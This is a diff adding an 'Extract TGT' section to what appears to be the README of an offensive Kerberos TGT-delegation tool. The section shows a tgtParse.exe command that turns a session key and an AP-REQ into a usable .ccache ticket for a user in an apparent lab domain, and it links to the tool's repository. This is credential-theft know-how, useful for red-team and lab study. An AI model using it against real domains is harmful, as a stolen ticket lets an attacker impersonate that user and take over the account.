@@ -94,6 +94,19 @@ AES256
 ----------------------------------------------------------------------------
 [*] TGT delegation attempt finished. Reverting to original identity.
 ```
+
+## Extract TGT
+At present, the method for extracting the TGT from the ap-req has not been redone. An implementation is planned for the future.
+
+Connor McGarr (@33y0re) has already made an offline implementation:
+```
+.\tgtParse.exe --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256
+[+] Identified ticket for robb.stark@NORTH.SEVENKINGDOMS.LOCAL
+[+] Successfully extracted the TGT! Saved as: robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache!
+Local path to usable .ccache: C:\...(snip)...\robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache
+```
+- [https://github.com/connormcgarr/tgtdelegation/tree/master](https://github.com/connormcgarr/tgtdelegation/tree/master)
+- [https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse](https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse)
 ## Limits
 There are a few limitations,it doesn't work if the target accounts are:
 - member of protected users;
